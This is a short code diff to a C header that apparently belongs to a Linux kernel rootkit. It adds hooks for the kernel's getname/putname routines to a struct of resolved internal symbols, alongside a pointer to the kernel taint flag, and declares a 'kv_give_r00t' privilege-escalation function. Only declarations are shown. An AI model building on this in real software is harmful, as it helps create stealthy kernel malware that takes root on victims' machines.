@@ -64,6 +64,9 @@ typedef asmlinkage long (*sys64)(struct pt_regs *regs);
 
 typedef void (*do__set_task_comm_sg)(struct task_struct *, const char *, bool);
 
+typedef struct filename *(*getname_sg)(const char __user *);
+typedef void (*putname_sg)(struct filename *);
+
 struct kernel_syscalls {
 	attach_pid_sg k_attach_pid;
 	bpf_map_get_sg k_bpf_map_get;
@@ -74,6 +77,8 @@ struct kernel_syscalls {
 	do_exit_sg k_do_exit;
 #endif
 	do__set_task_comm_sg k__set_task_comm;
+	getname_sg k_getname;
+	putname_sg k_putname;
 	unsigned long *tainted;
 };
 
@@ -187,5 +192,7 @@ static void __attribute__((unused)) mem_free(int argc, ...)
 	va_end(ap);
 }
 #define kv_mem_free(...) mem_free(PP_NARG(__VA_ARGS__), __VA_ARGS__)
+
+int kv_give_r00t(void);
 
 #endif
